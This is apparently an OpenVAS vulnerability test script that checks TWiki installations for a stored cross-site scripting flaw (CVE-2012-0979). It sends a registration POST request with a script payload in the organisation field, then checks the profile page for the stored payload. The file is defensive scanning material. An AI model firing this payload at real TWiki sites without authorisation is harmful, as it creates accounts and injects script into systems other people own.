###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_twiki_organization_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# TWiki 'organization' Cross-Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "TWiki version 5.1.1 and prior";
tag_insight = "The flaw is due to an improper validation of user-supplied input
  to the 'organization' field when registering or editing a user, which allows
  attackers to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site.";
tag_solution = "No solution or patch is available as of 21st March, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://twiki.org/cgi-bin/view/Codev/DownloadTWiki";
tag_summary = "The host is running TWiki and is prone to cross site scripting
  vulnerability.";

if(description)
{
  script_id(802391);
  script_version("$Revision: 12 $");
  script_bugtraq_id(51731);
  script_cve_id("CVE-2012-0979");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-20 12:04:55 +0530 (Tue, 20 Mar 2012)");
  script_name("TWiki 'organization' Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/78664");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47784");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72821");
  script_xref(name : "URL" , value : "http://www.securitytracker.com/id?1026604");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51731/info");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/109246/twiki-xss.txt");

  script_description(desc);
  script_summary("Check for XSS vulnerability in TWiki");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_twiki_detect.nasl");
  script_require_keys("twiki/installed");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Variables Initialization
twikiPort  = 0;
dir  = "";
host = "";
url = "";
req = "";
res = "";
postdata = "";
sndReq = "";
rcvRes = "";


## Stored XSS (Not a safe check)
if(safe_checks()){
  exit(0);
}

## Check for default port
twikiPort = get_http_port(default:80);
if(!twikiPort){
  twikiPort = 80;
}

## Check port state
if(!get_port_state(twikiPort)){
  exit(0);
}

## Get Twiki Installed Location
if(!dir = get_dir_from_kb(port:twikiPort, app:"TWiki")){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}


## Construct the Attack Request
url = dir + "/bin/register/Main/WebHome";

## Construct the POST data
postdata = "crypttoken=ad240d2a0504042701980e88c85bbc33&Twk1FirstName=ccc&Twk1" +
           "LastName=ccc&Twk1WikiName=CccCcc&Twk1Email=ccc%40ccc.com&Twk0"      +
           "Password=ccc&Twk0Confirm=ccc&Twk0OrganisationName=%3Cscript%3E"     +
           "alert%28document.cookie%29%3B%3C%2Fscript%3E&Twk0OrganisationURL="  +
           "&Twk1Country=Belize&Twk0Comment=&rx=%25BLACKLISTPLUGIN%7B+action"   +
           "%3D%22magic%22+%7D%25&topic=TWikiRegistration&action=register";

## Construct the POST request
req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent:  XSS-TEST\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postdata), "\r\n",
             "\r\n", postdata);

## Send XSS attack
res = http_keepalive_send_recv(port:twikiPort, data:req);

if (res)
{
  ##Confirm the Attack by opening the registered profile
  url = dir + "/bin/view/Main/CccCcc";

  if(http_vuln_check(port:twikiPort, url:url, pattern:"<script>alert" +
                           "\(document.cookie\);</script>", check_header:TRUE))
  {
    security_warning(twikiPort);
    exit(0);
  }
}
